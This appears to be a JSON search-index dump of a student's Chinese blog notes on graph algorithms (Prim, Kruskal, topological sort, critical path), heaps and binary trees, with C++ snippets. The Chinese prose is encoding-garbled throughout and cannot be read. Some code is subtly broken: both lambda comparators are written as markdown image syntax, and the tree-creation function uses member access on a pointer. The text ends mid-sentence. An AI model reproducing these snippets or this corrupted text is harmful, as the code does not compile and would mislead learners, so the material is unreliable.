graph[i][j];\n        if (graph[i][j] == 0 && i != j) graph[i][j] = INT_MAX; // æ— è¾¹å½“ä½œ âˆ\n    }\n}\n```\n**Prim ç®—æ³•éå†é‚»æ¥çŸ©é˜µæ‰€æœ‰ç‚¹**ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ã€‚\n\n- é‚»æ¥è¡¨å®ç°ï¼š\n```cpp\n #include <iostream>\n#include <vector>\n#include <queue>\nusing namespace std;\n\nstruct Edge {\n    int to, weight;\n    bool operator>(const Edge &e) const {\n        return weight > e.weight;  // å°æ ¹å †\n    }\n};\n\nconst int N = 1001; //é¡¶ç‚¹æœ€å¤§ä¸ªæ•°\nvector<Edge> graph[N]; //å›¾ï¼Œé‚»æ¥è¡¨è¡¨ç¤ºçš„ï¼Œæ•°ç»„ç´¢å¼•iè¡¨ç¤ºæ˜¯ç¬¬iä¸ªèŠ‚ç‚¹ï¼Œå­˜çš„æ˜¯è¾¹é“¾è¡¨çš„å¤´\nbool visited[N];\n\nint prim(int start) {\n    priority_queue<Edge, vector<Edge>, greater<Edge>> pq;\n    visited[start] = true;\n\n    for (auto &e : graph[start]) pq.push(e); \n    \n    int total_weight = 0;\n\n    while (!pq.empty()) {\n        Edge curr = pq.top(); pq.pop();\n        if (visited[curr.to]) continue;\n\n        visited[curr.to] = true;\n        total_weight += curr.weight;\n\n        for (auto &e : graph[curr.to]) {\n            if (!visited[e.to]) pq.push(e);\n        }\n    }\n    return total_weight;\n}\n\n```\n\n#### Kruskal ç®—æ³•\nç®—æ³•æ€æƒ³å¾ˆç®€å•ï¼š\n> æˆ‘å…ˆæŠŠå…¨ä¸–ç•Œæœ€ä¾¿å®œçš„è¾¹æ‰¾å‡ºæ¥ï¼Œæƒ³åŠ å°±åŠ ï¼Œåªè¦å®ƒä¸ä¼šæˆç¯ã€‚\n\né‚£ä¹ˆ**å…ˆæŠŠè¾¹æŒ‰æƒå€¼å¤§å°æ’åºï¼Œä»ä¸Šå¾€ä¸‹åŠ å…¥è¾¹ï¼Œå¦‚æœä¸æˆç¯å°±åŠ **ã€‚ï¼ˆè¿™é‡Œåˆ¤æ–­æ˜¯å¦æˆç¯éœ€è¦ç”¨åˆ°å¹¶æŸ¥é›†ï¼‰ã€‚\nä»£ç ä¹‹åè¡¥å……ï¼Œå› ä¸ºè¿˜æ²¡äº†è§£å¹¶æŸ¥é›†ğŸ˜¿ã€‚\n\n---\n### æ‹“æ‰‘æ’åºç®—æ³•\n![image.png](https://img.moyuin.top/i/2025/04/10/67f7b8ca34b28.png)\n\næ‹“æ‰‘æ’åºè¿˜æ˜¯å¾ˆå®¹æ˜“å»ç†è§£çš„ï¼Œæˆ‘ä»¬æ ¹æ®å‰åå…³è”æ€§å¯ä»¥è½»æ¾å†™å‡ºå®ƒçš„æ‹“æ‰‘æ’åºã€‚\næ‹“æ‰‘æ’åºç®—æ³•ä¸€èˆ¬è¿˜æ˜¯ç”¨äºæŸ¥æ‰¾è¯¥å›¾â€œæ˜¯å¦æœ‰æ‹“æ‰‘æ’åºâ€ã€‚\n\n---\n#### å…³é”®è·¯å¾„\nä»èµ·ç‚¹åˆ°æŸç‚¹çš„æœ€é•¿è·¯å¾„ç§°ä¸ºèµ·ç‚¹åˆ°è¯¥ç‚¹çš„**å…³é”®è·¯å¾„**ã€‚ä¸€èˆ¬ç”¨äºAOEç½‘ç»œã€‚\n![image.png](https://img.moyuin.top/i/2025/04/15/67fdc0f8c51bb.png)\n\nå…³é”®è·¯å¾„ä¸Šçš„æ´»åŠ¨è¢«ç§°ä¸º**å…³é”®æ´»åŠ¨**ã€‚\nå¯¹äºä¸€ä¸ªå›¾çš„ä¼˜å…ˆè°ƒåº¦ï¼Œæœ‰å¤šä½™çš„äººåŠ›ç‰©åŠ›æ”¾åœ¨éå…³é”®è·¯å¾„ä¸Šå…¶å®æ˜¯ä¸èµ·æ•ˆæœçš„ã€‚\n**æ±‚è§£å…³é”®è·¯å¾„**ï¼š\n![image.png](https://img.moyuin.top/i/2025/04/15/67fdc43fa4398.png)\n\nç›®æ ‡ï¼š**ä» vâ‚€ å‡ºå‘èµ°åˆ° vâ‚ˆï¼Œæ‰¾å‡ºè€—æ—¶æœ€é•¿ä½†ä¸èƒ½è€½è¯¯ä»»ä½•ç¯èŠ‚çš„ä¸€æ¡è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯â€œå…³é”®è·¯å¾„â€ã€‚**\n\nA. å…ˆç®—æ¯ä¸ªäº‹ä»¶çš„ `earliest[v]`\n ä»èµ·ç‚¹ vâ‚€ å¼€å§‹ï¼Œæœ€æ—©å‘ç”Ÿæ—¶é—´è®°ä¸º 0\nç„¶åå‘ä¸‹æ¸¸ä¼ æ’­ï¼ŒæŒ‰ä¸‹å¼æ¨ï¼š\n> `earliest[v] = max{ earliest[u] + weight(u,v) }`\n\næŒ‰é¡ºåºæ¥ç®—ï¼š\n- **vâ‚€** = 0ï¼ˆèµ·ç‚¹ï¼‰\n- **vâ‚** = vâ‚€ + 5 = **5**ï¼ˆaâ‚€ï¼‰\n- **vâ‚‚** = vâ‚€ + 3 = **3**ï¼ˆaâ‚ï¼‰\n- **vâ‚ƒ** = vâ‚‚ + 5 = **8**ï¼ˆaâ‚‚ï¼‰\n    \n- **vâ‚„** æœ‰ä¸¤æ¡è·¯ï¼š\n    - vâ‚‚ + 1 = 4ï¼ˆaâ‚ƒï¼‰\n    - vâ‚ + 4 = 9ï¼ˆaâ‚„ï¼‰â†’ å– max â†’ **9**\n    \n- **vâ‚…** = vâ‚ + 2 = **7**ï¼ˆaâ‚…ï¼‰\n    \n- vâ‚† æœ‰ä¸¤æ¡è·¯ï¼š\n    - vâ‚ƒ + 7 = 15ï¼ˆaâ‚†ï¼‰\n    - vâ‚„ + 5 = 14ï¼ˆaâ‚‡ï¼‰â†’ max â†’ **15**\n        \n- **vâ‚‡** æœ‰ä¸¤æ¡è·¯ï¼š\n    - vâ‚„ + 5 = 14ï¼ˆaâ‚ˆï¼‰\n    - vâ‚… + 6 = 13ï¼ˆaâ‚‰ï¼‰â†’ max â†’ **14**\n        \n- **vâ‚ˆ** æœ‰ä¸¤æ¡è·¯ï¼š\n    - vâ‚† + 2 = 17ï¼ˆaâ‚â‚€ï¼‰\n    - vâ‚‡ + 8 = 22ï¼ˆaâ‚â‚ï¼‰â†’ max â†’ **22**\n        \näºæ˜¯ä½ ç°åœ¨æœ‰äº† `earliest[v]` ï¼šè§å›¾ä¸­ç»¿è‰²æ•°å­—ã€‚\n\nB. åè¿‡æ¥ç®— `latest[v]`ï¼ˆä»ç»ˆç‚¹å¾€å‰æ¨ï¼‰\nä»ç»ˆç‚¹ vâ‚ˆ å¼€å§‹ï¼š\n- vâ‚ˆ = 22ï¼ˆè®¾ä¸ºåŸºå‡†ï¼‰\næˆ‘ä»¬ç”¨å…¬å¼ï¼š\n> `latest[u] = min{ latest[v] - weight(u,v) }`\n\nå€’ç€æ¥ç®—\n- vâ‚‡ = vâ‚ˆ - 8 = **14**ï¼ˆaâ‚â‚ï¼‰\n- vâ‚† = vâ‚ˆ - 2 = **20**ï¼ˆaâ‚â‚€ï¼‰\n- vâ‚… = vâ‚‡ - 6 = **8**ï¼ˆaâ‚‰ï¼‰\n\n- vâ‚„ï¼š\n    - vâ‚‡ - 5 = 9ï¼ˆaâ‚ˆï¼‰\n    - vâ‚† - 5 = 15ï¼ˆaâ‚‡ï¼‰â†’ å– **min = 9**\n    \n- vâ‚ƒ = vâ‚† - 7 = **13**\n    \n- vâ‚‚ï¼š\n    - vâ‚ƒ - 5 = 8ï¼ˆaâ‚‚ï¼‰\n    - vâ‚„ - 1 = 8ï¼ˆaâ‚ƒï¼‰â†’ min = **8**\n    \n- vâ‚:\n    - vâ‚„ - 4 = 5ï¼ˆaâ‚„ï¼‰\n    - vâ‚… - 2 = 6ï¼ˆaâ‚…ï¼‰â†’ min = **5**\n        \n- vâ‚€:\n    - vâ‚ - 5 = 0ï¼ˆaâ‚€ï¼‰    \n    - vâ‚‚ - 3 = 5ï¼ˆaâ‚ï¼‰â†’ min = **0**\n    \nC. è®¡ç®—æ¯æ¡æ´»åŠ¨çš„ e[i] å’Œ l[i]\nå¯¹æ¯æ¡æ´»åŠ¨ aáµ¢ï¼š\n`e[i] = earliest[u]` ï¼ˆæ´»åŠ¨èµ·ç‚¹çš„æœ€æ—©æ—¶é—´ï¼‰\n`l[i] = latest[v] - weight(u,v)`ï¼ˆç»ˆç‚¹æœ€æ™šæ—¶é—´-ä»»åŠ¡è€—æ—¶ï¼‰\nè‹¥ `e[i] == l[i]`ï¼Œè¯´æ˜è¯¥æ´»åŠ¨ä¸èƒ½æ™šï¼Œå°±æ˜¯å…³é”®è·¯å¾„çš„ä¸€éƒ¨åˆ†ï¼\n\næˆ‘ä»¬æ¥å®é™…ä¸¾å‡ ä¸ªï¼š\n aâ‚€ï¼ˆvâ‚€â†’vâ‚ï¼‰ï¼š\n- e[0] = earliest[vâ‚€] = 0\n- l[0] = latest[vâ‚] - 5 = 5 - 5 = 0 âœ”ï¸ e = l â†’ **å…³é”®è·¯å¾„**\n    \n aâ‚„ï¼ˆvâ‚â†’vâ‚„ï¼‰ï¼š\n- e = 5ï¼ˆvâ‚ï¼‰\n- l = 9 - 4 = 5 âœ”ï¸ å…³é”®è·¯å¾„\n    \naâ‚†ï¼ˆvâ‚ƒâ†’vâ‚†ï¼‰ï¼š\n- e = 8ï¼ˆvâ‚ƒï¼‰\n- l = 20 - 7 = 13 âœ˜ ä¸æ˜¯å…³é”®è·¯å¾„ï¼ˆ8 â‰  13ï¼‰\n\nè¿æ¥æ‰€æœ‰ e[i]=I[i] çš„ç‚¹ï¼Œå¾—åˆ°å…³é”®è·¯å¾„ã€‚\næœ€ç»ˆå…³é”®è·¯å¾„æ˜¯ï¼š\n> **vâ‚€ â†’ vâ‚ â†’ vâ‚„ â†’ vâ‚‡ â†’ vâ‚ˆ**\n\næ€»è€—æ—¶ï¼š5 + 4 + 5 + 8 = **22**ï¼ˆä¹Ÿå°±æ˜¯é¡¹ç›®æœ€æ—©å®Œæˆæ—¶é—´ï¼‰","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"æ•°æ®ç»“æ„-å †","url":"/2025/04/01/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-dui/","content":"# æ•°æ®ç»“æ„-å †\n\n# å †(å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—)\n\nä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯ä¸€ç§ç‰¹æ®Šçš„é˜Ÿåˆ—ï¼Œç‰¹æ®Šåœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—çš„**å‡ºé˜Ÿé¡ºåº**æŒ‰ç…§äº‹å…ˆè§„å®šçš„**ä¼˜å…ˆçº§é¡ºåº**è¿›è¡Œã€‚\nå¯ä»¥ç”¨**çº¿æ€§è¡¨**å®ç°ï¼Œä½†æ¯æ¬¡éœ€è¦éå†ï¼Œè¿™æ ·çš„å‡ºé˜Ÿæ“ä½œå¤æ‚åº¦ä¸º O(n)ï¼Œæ•ˆç‡ä½ï¼Œå› æ­¤è€ƒè™‘ä½¿ç”¨**å †**æ¥å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚\nå †é€šå¸¸çœ‹ä½œæ˜¯**ä¸€æ£µå®Œå…¨äºŒå‰æ ‘**ï¼Œä¸”æŸä¸ªèŠ‚ç‚¹çš„å€¼æ€»æ˜¯ä¸å¤§äºæˆ–ä¸å°äºå…¶çˆ¶èŠ‚ç‚¹çš„å€¼ã€‚\n\n## åŸºæœ¬ç†è§£\nå‚è€ƒçš„æ˜¯CSDNçš„ä¸€æ¡[æ•™ç¨‹](https://blog.csdn.net/xiaomucgwlmx/article/details/103522410)ï¼Œå¾ˆå¥½ç†è§£ã€‚\n### å †çš„æ’å…¥\næ¯æ¬¡éƒ½æ˜¯æ–°æ•°æ®æ”¾åœ¨æ•°ç»„æœ€åï¼Œç„¶åå°†æ•°æ®äº¤æ¢ä»¥æ»¡è¶³å †çš„æ€§è´¨ï¼ˆæœ€å¤§å †ï¼Œæœ€å°å †ï¼‰ã€‚\n![](/images/æ•°æ®ç»“æ„-å †/20250401161835075.png)\næ’å…¥æ•°æ® 16\n![](/images/æ•°æ®ç»“æ„-å †/20250401162218264.png)\nä¸ºæ»¡è¶³æœ€å¤§å †ï¼Œè°ƒæ•´ä½ç½®ï¼Œæœ‰çˆ¶èŠ‚ç‚¹ä¸å­©èŠ‚ç‚¹äº¤æ¢ã€‚\n![](/images/æ•°æ®ç»“æ„-å †/20250401161953977.png)\nä¾ç„¶æ²¡æœ‰å®Œå…¨ç¬¦åˆæœ€å¤§å †ï¼ˆæ ¹èŠ‚ç‚¹æ•°æ®æœ€å¤§ï¼‰ï¼Œç»§ç»­è°ƒæ•´ä½ç½®ã€‚\n![](/images/æ•°æ®ç»“æ„-å †/20250401162400848.png)\n\n### å †çš„èŠ‚ç‚¹åˆ é™¤\n![](/images/æ•°æ®ç»“æ„-å †/20250401162859978.png)\nå †ä¸­**æ¯æ¬¡åˆ é™¤éƒ½åªèƒ½åˆ é™¤å †é¡¶å…ƒç´ **ã€‚å®é™…æ“ä½œæ˜¯ç»™æœ€åä¸€ä¸ªæ•°æ®çš„å€¼ï¼ˆæœ€å¤§æˆ–æœ€å°å€¼ï¼Œè§†å †çš„æ€§è´¨è€Œå®šï¼‰èµ‹å€¼åˆ°å †é¡¶ï¼Œç„¶åè°ƒæ•´ä½ç½®ã€‚\n![](/images/æ•°æ®ç»“æ„-å †/20250401163525900.png)\nç„¶åå¼€å§‹ä¸æ–­è°ƒæ•´...\n![](/images/æ•°æ®ç»“æ„-å †/20250401163552994.png)\n![](/images/æ•°æ®ç»“æ„-å †/20250401163558282.png)\n\n### æ„é€ æœ€å¤§å †\næˆ‘ä»¬ä»ä¸€ä¸ªä¾‹é¢˜å¼€å§‹ã€‚ç›®å‰æˆ‘ä»¬æœ‰åŸå§‹æ•°ç»„\n`a[]={4,1,3,2,16,9,10,14,8,7}`\né‡‡ç”¨é¡ºåºå­˜å‚¨çš„æ–¹å¼ï¼Œå¯¹åº”çš„å®Œå…¨äºŒå‰æ ‘å¦‚ä¸‹å›¾ï¼š\n![](/images/æ•°æ®ç»“æ„-å †/20250401163639280.png)\nå‡è®¾æ•°ç»„ä¸­æœ‰ n ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬çš„éå†ä¸è°ƒæ•´åº”è¯¥ä»`a[i],æ­¤æ—¶ i=n/2-1` å¼€å§‹ï¼Œç„¶åå¾€å‰æ¨ã€‚ï¼ˆå³æœ€ä¸­é—´çš„é‚£ä¸ªå…ƒç´ ï¼‰ï¼Œå°†å®ƒçœ‹ä½œçˆ¶èŠ‚ç‚¹ï¼Œå»å’Œå®ƒçš„å­©å­æ¯”è¾ƒï¼ˆ**ä¸è¦å’Œå®ƒçš„çˆ¶èŠ‚ç‚¹æ¯”è¾ƒ**ï¼‰ã€‚ä¸€æ ·çš„é€»è¾‘ï¼Œä¸æ–­æ¯”è¾ƒçˆ¶èŠ‚ç‚¹å’Œå­©å­èŠ‚ç‚¹è°ƒæ•´ï¼Œæœ€ååšåˆ°æœ€å¤§çš„æ•°åœ¨æœ€ä¸Šé¢ã€‚\n\n![](/images/æ•°æ®ç»“æ„-å †/20250401164025600.png)\n\næ¨å®Œäº†å¦‚æœå‘ç°ä¸æ˜¯æœ€å¤§å †å½¢å¼ï¼Œæˆ‘ä»¬å°±ä»æœ€åˆç‚¹ï¼ˆ `a[0]` ï¼‰ç»§ç»­äº¤æ¢ï¼Œå¯¹äº¤æ¢åçš„å€¼ç»§ç»­äº¤æ¢...\n\n**æœ€å°å †æ„é€ ä¸æœ€å¤§å †æ„é€ å‡ ä¹ä¸€è‡´ï¼Œåªæ˜¯æ¯”è¾ƒè°ƒæ•´çš„æ—¶å€™é€»è¾‘æ˜¯æœ€å°çš„æ¢åˆ°çˆ¶èŠ‚ç‚¹ã€‚**\n\n- æœ€å¤§å †çš„æ’å…¥èŠ‚ç‚¹å°±æ˜¯åœ¨å †çš„æœ€åï¼Œæœ€å°å€¼åé¢æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæ²¿ç€æ•°å †ä¸Šå‡è°ƒæ•´ï¼Œå’Œå †çš„æ’å…¥æ˜¯ä¸€è‡´çš„ã€‚\n- å †é¡¶èŠ‚ç‚¹åˆ é™¤æ€æƒ³ï¼šå°†å †æ ‘çš„æœ€åèŠ‚ç‚¹æ”¾åˆ°æ ¹èŠ‚ç‚¹ï¼Œåˆ é™¤æœ€å¤§å€¼ï¼Œå†é‡æ–°åˆå§‹åŒ–è°ƒæ•´æ¯”è¾ƒã€‚\né€»è¾‘æ˜¯ä¸€æ ·çš„ã€‚\n## æ¦‚å¿µ\n### äºŒå‰å †\näºŒå‰å †æ˜¯ä¸€ä¸ªç”¨**å®Œå…¨äºŒå‰æ ‘**æ¥å®ç°çš„**ä¼˜å…ˆé˜Ÿåˆ—**ç»“æ„ï¼Œæ”¯æŒé«˜æ•ˆæ’å…¥ä¸å–æœ€å€¼æ“ä½œã€‚\n#### ç‰¹ç‚¹\n- **å®Œå…¨äºŒå‰æ ‘**ï¼ˆé™¤äº†æœ€åä¸€å±‚ï¼Œå…¶ä»–å±‚éƒ½æ»¡ï¼Œä¸”ä»å·¦åˆ°å³å¡«æ»¡ï¼‰\n- æ¯ä¸ªç»“ç‚¹éƒ½æ»¡è¶³ï¼š\n    - **æœ€å°å †ï¼ˆå°æ ¹å †ï¼‰**ï¼šçˆ¶èŠ‚ç‚¹ â‰¤ å­èŠ‚ç‚¹\n    - **æœ€å¤§å †ï¼ˆå¤§æ ¹å †ï¼‰**ï¼šçˆ¶èŠ‚ç‚¹ â‰¥ å­èŠ‚ç‚¹\n- ç”¨**æ•°ç»„**å®ç°ï¼ˆå› ä¸ºå®Œå…¨äºŒå‰æ ‘å¯ä»¥ç”¨ä¸‹æ ‡æ˜ å°„ï¼‰\n#### å°æŠ€å·§\n- çˆ¶èŠ‚ç‚¹ä¸‹æ ‡ i â†’ å·¦å­èŠ‚ç‚¹ 2iï¼Œå³å­èŠ‚ç‚¹ 2i+1\n- å­èŠ‚ç‚¹ j â†’ çˆ¶èŠ‚ç‚¹æ˜¯ j/2ï¼ˆå‘ä¸‹å–æ•´ï¼‰\n- ä¸Šè°ƒæ’å…¥ push O(log n)ï¼Œä¸‹è°ƒåˆ é™¤æœ€å€¼ pop O(log n)ï¼Œå–æœ€å€¼ O(1)\näºŒå‰å †æ˜¯ä¸€ç§éšå¼æ•°æ®ç»“æ„ï¼Œå°†å…ƒç´ çš„é€»è¾‘ç»“æ„è•´å«åœ¨å­˜å‚¨ç»“æ„ä¸­ï¼Œé¿å…é¢å¤–çš„æŒ‡é’ˆç©ºé—´å¼€é”€ï¼Œæ‰€ä»¥ç»å¸¸ç”¨ã€‚\n\n### å¤šå‰å †\nå¤šå‰å †ï¼ˆd-ary heapï¼‰å°±æ˜¯ä¸€ä¸ª**æ¯ä¸ªèŠ‚ç‚¹æœ‰ d ä¸ªå­©å­çš„å †**ï¼Œä¹Ÿæ˜¯ä¸€ç§ç”¨æ•°ç»„å®ç°çš„ä¼˜å…ˆé˜Ÿåˆ—ã€‚\n#### ç‰¹ç‚¹\n- ä¸€èˆ¬æ˜¯**d å‰å®Œå…¨æ ‘**\n- å°æ ¹å † / å¤§æ ¹å †åŸåˆ™ä¾ç„¶æˆç«‹\n- ç»“æ„ä»ç„¶æ˜¯æ•°ç»„å®ç°ï¼Œä¸è¿‡ä¸‹æ ‡å…³ç³»ä¼šå˜åŒ–ï¼š\n\nğŸ“Œ è®¾æ ¹èŠ‚ç‚¹ä¸‹æ ‡ä¸º 0ï¼ˆæˆ– 1 è§†å®ç°è€Œå®šï¼‰ï¼š\n- çˆ¶èŠ‚ç‚¹  i â†’ å­èŠ‚ç‚¹èŒƒå›´æ˜¯ï¼š`d*i + 1` åˆ° `d*i + d`\n- å­èŠ‚ç‚¹  jâ†’ çˆ¶èŠ‚ç‚¹æ˜¯ï¼š`(j - 1) / d`\n\n### åº”ç”¨\n- å“ˆå¤«æ›¼æ ‘çš„æ„å»ºã€‚\n![](/images/æ ‘/20250325101821385.png)\n- Dijkstra æœ€çŸ­è·¯å¾„çš„æ„å»º\n- è´ªå¿ƒç®—æ³•\n## å®ç°\n### STL å®ç°\nåœ¨ STL é‡Œæœ‰ä¸€ä¸ªç°æˆçš„â€œä¼˜å…ˆé˜Ÿåˆ—â€ã€‚\n```cpp\nstd::priority_queue\n```\næœ¬èº«æ˜¯ä¸€ä¸ªå †ç»“æ„å°è£…å¥½çš„æ•°æ®ç»“æ„ï¼Œé»˜è®¤ç”¨çš„æ˜¯å¤§æ ¹å †ï¼Œæœ€å¤§å€¼ä¼˜å…ˆã€‚\n```cpp\n#include <queue>\n#include <vector>\n#include <iostream>\nusing namespace std;\n\nint main() {\n    priority_queue<int> pq;\n\n    pq.push(5);\n    pq.push(2);\n    pq.push(8);\n\n    cout << pq.top() << endl; // è¾“å‡º 8ï¼ˆæœ€å¤§å€¼ï¼‰\n\n    pq.pop(); // åˆ é™¤æœ€å¤§å€¼\n\n    cout << pq.top() << endl; // è¾“å‡º 5\n\n    return 0;\n}\n\n```\nå¦‚æœæƒ³è¦æœ€å°å€¼ä¼˜å…ˆï¼Œå¯ä»¥æ„é€ ä¼˜å…ˆçº§é˜Ÿåˆ—çš„æ—¶å€™ï¼Œä¼ å…¥æ¯”è¾ƒå‡½æ•°ã€‚\n```cpp\npriority_queue<int, vector<int>, greater<int>> pq;\n\npq.push(5);\npq.push(2);\npq.push(8);\n\ncout << pq.top() << endl; // è¾“å‡º 2ï¼ˆæœ€å°å€¼ï¼‰\n\n```\nå¦‚æœæƒ³è¦è‡ªå®šä¹‰ç»“æ„ä½“çš„ä¼˜å…ˆçº§ï¼Œå¾—å…ˆå†™ä¸€ä¸ªæ¯”è¾ƒå™¨ï¼ˆæˆ–è€…lambdaè¡¨è¾¾å¼ç­‰ï¼‰\n```cpp\nstruct Node {\n    int id, val;\n};\nstruct cmp {\n    bool operator()(const Node &a, const Node &b) {\n        return a.val > b.val; // å°æ ¹å †ï¼švalå°çš„ä¼˜å…ˆ\n    }\n};\npriority_queue<Node, vector<Node>, cmp> pq;\n\n```\nè¿™é‡Œä¹Ÿé™„ä¸Šä¸€ä¸ªlambdaè¡¨è¾¾å¼çš„æ¨¡æ¿ï¼Œç”±äº lambda æ˜¯åŒ¿åç±»å‹ï¼Œè€Œpriority_queue æ˜¯æ¨¡æ¿ç±»ï¼Œæ‰€ä»¥ä¼ å‚ç•¥å¾®å¤æ‚ã€‚\n```cpp\nauto cmp = ![](const pair<int, int> &a, const pair<int, int> &b) {\n    return a.second > b.second;  // å°æ ¹å †ï¼šå€¼å°çš„ä¼˜å…ˆ\n};\n\npriority_queue<\n    pair<int, int>,\n    vector<pair<int, int>>,\n    decltype(cmp)\n> pq(cmp);\n\n```\nä¸ºä»€ä¹ˆè¦å†™ `decltype(cmp)`ï¼Ÿ\n- å› ä¸º lambda æ˜¯åŒ¿åç±»å‹ï¼Œå¿…é¡»ç”¨ `decltype` è·å–å®ƒçš„ç±»å‹ä½œä¸ºæ¨¡æ¿å‚æ•°ã€‚\n- ç„¶åæŠŠè¿™ä¸ªæ¯”è¾ƒå™¨ä¼ è¿›å»åˆå§‹åŒ–æ„é€ å‡½æ•° `pq(cmp)`\n **å®Œæ•´ç”¨æ³•**\n```cpp\n#include <iostream>\n#include <queue>\n#include <vector>\nusing namespace std;\n\nint main() {\n    // æŒ‰ second å°çš„ä¼˜å…ˆï¼ˆå°æ ¹å †ï¼‰\n    auto cmp = ![](const pair<int, int>& a, const pair<int, int>& b) {\n        return a.second > b.second;\n    };\n\n    priority_queue<\n        pair<int, int>,\n        vector<pair<int, int>>,\n        decltype(cmp)\n    > pq(cmp);  // æ³¨æ„è¦ä¼  cmp è¿›å»ï¼\n\n    pq.push({1, 10});\n    pq.push({2, 5});\n    pq.push({3, 20});\n\n    while (!pq.empty()) {\n        cout << pq.top().first << \" \" << pq.top().second << endl;\n        pq.pop();\n    }\n\n    return 0;\n}\n```\n","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"æ•°æ®ç»“æ„-æ ‘","url":"/2025/03/25/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-shu/","content":"# æ ‘\n\n## å®Œå…¨äºŒå‰æ ‘\n### åŸºæœ¬æ€§è´¨\nå®Œå…¨äºŒå‰æ ‘æœ‰nä¸ªç»“ç‚¹ã€‚\nå®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ **d=log2(n+1)**\n\n#### å­˜å‚¨ç»“æ„\nä¸»è¦å­˜å‚¨æ–¹å¼:é¡ºåºå­˜å‚¨+é“¾å¼å­˜å‚¨\n##### é¡ºåºå­˜å‚¨\nå„ä¸ªç»“ç‚¹çš„ç´¢å¼•ä¸é¡ºåºè¡¨ä½ç½®ä¸€ä¸€å¯¹åº”ï¼Œè®©ç»“ç‚¹çš„æ•°æ®å­˜æ”¾åœ¨é¡ºåºè¡¨ç›¸åº”ä½ç½®çš„å•å…ƒä¸­ã€‚\né¡ºåºå­˜å‚¨å½“æ•°ç»„ï¼Œä¸è¿‡è¦å¼€æ•°ç»„ï¼Œå¯èƒ½å®ç°ç©ºé—´æµªè´¹ã€‚\n![](/images/æ ‘/f42c3e4be40e4e3230917399d16f7ff.jpg)\n##### é“¾å¼å­˜å‚¨\n![](/images/æ ‘/b85220c0dc44ca17d84adda22934d8c.jpg)\n\næœ‰äºŒå‰é“¾è¡¨å’Œä¸‰å‰é“¾è¡¨ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æœ‰leftï¼Œrightï¼Œç”šè‡³è¿˜æœ‰ä¸€ä¸ªparentçš„æ•°æ®ç»“ç‚¹ï¼ŒæŒ‡å‘ä¸Šä¸€ä¸ªè¿™ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹ã€‚\n![](/images/æ ‘/ba9b63dc6eb98c6ffcb7f51f0b7916e.jpg)\n\n```cpp\nvoid createBinarytree(int value,node* left_tree,node* right_tree){\n\tnode *tree=new BinaryTreeNode();\n\ttree.data()=value;\n\ttree.left_tree()=left_tree;\n\ttree.right_tree()=right_tree;//åˆ›å»ºæ–°çš„äºŒå‰æ ‘\n}\n```\n#### éå†æ¦‚å¿µ\nåˆ†ä¸º**å‰åºéå†ï¼Œä¸­åºéå†ï¼Œååºéå†**\næ–¹æ³•ä¸åŒï¼Œæœ¬è´¨æ˜¯é€’å½’æ–¹å¼ä¸­è®¿é—®æ ¹èŠ‚ç‚¹çš„æ—¶æœºä¸åŒã€‚\nå…ˆéå†å·¦å­æ ‘ï¼Œå†éå†å³å­æ ‘ï¼Œè®¿é—®æ ¹èŠ‚ç‚¹rootæ˜¯æ’å…¥å…¶ä¸­çš„ã€‚éå†æ—¶é—´æ˜¯O(n)ã€‚\n![](/images/æ ‘/5c0005353c81ef9c30cc9715aed02d1.jpg)\nä¸»è¦æ˜¯ä¸­åºéå†ä¸å¤ªå¥½ç†è§£ã€‚æŠŠAçš„å·¦ä¾§å…ˆéå†äº†ï¼Œç„¶åå›åˆ°Aï¼Œç»§ç»­å›åˆ°å³ä¾§éå†ï¼Œä½†æ˜¯FKCè¿™é‡Œä¸å¥½ç†è§£ã€‚\n>å…ˆéå†Bçš„å·¦å­æ ‘Dï¼Œå¯¹äºDä¹Ÿæ˜¯ä¸­åºéå†çš„è§„åˆ™ï¼Œå…ˆæŠŠDçš„å·¦å­æ ‘éå†äº†ï¼Œå¯¹äºDçš„å·¦å­æ ‘åªæœ‰ä¸€ä¸ªç»“ç‚¹Hï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹å°±æ˜¯Hï¼Œç„¶åéå†Dçš„å³å­æ ‘Iï¼Œç„¶åå›åˆ°Dï¼Œæ¥åˆ°Bï¼Œæ¥ç€éå†Bçš„å³å­æ ‘Eï¼Œç”±äºEæ²¡æœ‰å·¦å­æ ‘ï¼Œæ‰€ä»¥ç›´æ¥ä»ç©ºå›åˆ°Eï¼Œç„¶åè¯»å–å³ç»“ç‚¹ï¼Œè¯»å–Jï¼Œè¯»å®ŒåBçš„æ•´ä¸ªå·¦å­æ ‘è¯»å–å®Œæˆï¼Œæ¥ç€æˆ‘ä»¬å›åˆ°Aï¼Œç„¶åè¯»å–Cè¿™é¢—å³å­æ ‘ï¼Œç”±äºCè¿™æ£µæ ‘æœ‰å·¦ç»“ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯»å–Fè¿™é¢—å·¦æ ‘ï¼Œè¿™æ£µFæ ‘çš„å·¦ç»“ç‚¹ä¸ºç©ºï¼Œæ‰€ä»¥ä»ç©ºè¿”å›Fï¼Œæ¥ç€è¯»å–Fçš„å³æ ‘kï¼Œä¹‹åFè¿™é¢—å·¦æ ‘å®Œå…¨å®Œæˆï¼Œå›åˆ°Cï¼ŒCçš„å³å­æ ‘ä¸ºç©ºï¼Œæ‰€ä»¥æ­¤æ—¶æ­¤åˆ»éå†ç»“æŸã€‚\n\nè¯å¤ªå¤šã€‚\n**ä¸­åºéå†**å°±æ˜¯ï¼šå…ˆè¯»å·¦è¾¹çš„å°ä¸‰è§’å½¢ â†’ ç„¶ååˆ°é¡¶ç‚¹ â†’ 